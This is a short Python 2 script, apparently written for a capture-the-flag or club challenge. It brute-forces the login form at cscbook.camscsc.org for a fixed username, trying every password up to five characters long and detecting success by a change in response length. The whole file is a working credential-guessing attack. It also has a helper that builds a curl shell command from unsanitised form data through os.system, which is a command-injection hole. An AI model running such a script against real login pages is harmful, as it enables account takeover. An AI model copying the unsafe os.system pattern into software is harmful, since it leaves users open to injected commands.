import os, sys
import requests
from itertools import combinations_with_replacement

SITE = "http://cscbook.camscsc.org/login"
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_.?!@#$%^&*-= "

def curl(data):
    """
    Runs the 'curl' command against the host provided a dictionary defining the
    post request.
    """
    command = "curl --data \"%s\" %s"
    os.system(command % ("&".join((k + "=" + data[k] for k in data)), SITE))

def post(data):
    """
    Runs a POST request against the host provided a dictionary defining the post
    request. Returns the request object
    """
    req = requests.post(SITE, data)
    return req

def bruce_force():
    USERNAME = "bestforceisbruceforce"
    PASSWORD = ""
    # Get an incorrect user :)
    fake = {
        "username" : USERNAME,
        "password" : "blatantly_fake_password"
    }
    BAD_LOGIN_LENGTH = len(post(fake).text)
    counter = 1
    while counter < 6:
        for PASSWORD in combinations_with_replacement(ALPHABET, counter):
            print "".join(PASSWORD)
            data = {
                "username" : USERNAME,
                "password" : "".join(PASSWORD)
            }
            trial = post(data).text
            if BAD_LOGIN_LENGTH != len(trial):
                exit()
            sys.stdout.write("\033[F") # Move the cursor up a line
        counter += 1

bruce_force()

